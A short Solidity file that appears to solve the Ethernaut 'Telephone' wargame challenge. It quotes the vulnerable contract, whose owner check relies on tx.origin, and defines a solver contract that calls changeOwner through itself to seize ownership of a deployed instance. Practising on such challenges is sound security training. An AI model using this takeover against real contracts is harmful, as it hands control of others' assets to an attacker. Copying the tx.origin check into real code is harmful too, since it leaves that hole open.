// SPDX-License-Identifier: MIT
//0x0454D86844f529007b33f5784121fC8AA8380354
pragma solidity ^0.8.0;

// contract Telephone {

//   address public owner;

//   constructor() {
//     owner = msg.sender;
//   }

//   function changeOwner(address _owner) public {
//     if (tx.origin != msg.sender) {
//       owner = _owner;
//     }
//   }
// }
import "../challs/Telephone.sol";
contract TelephoneSolver {
    Telephone cont;
    
    constructor() {
        cont = Telephone(0x0454D86844f529007b33f5784121fC8AA8380354);
    }

    function exp() external{
        cont.changeOwner(address(0xdCC36b9cbC0dbaDBCCFB2f5dD70e5AdB5024F707));
    }
}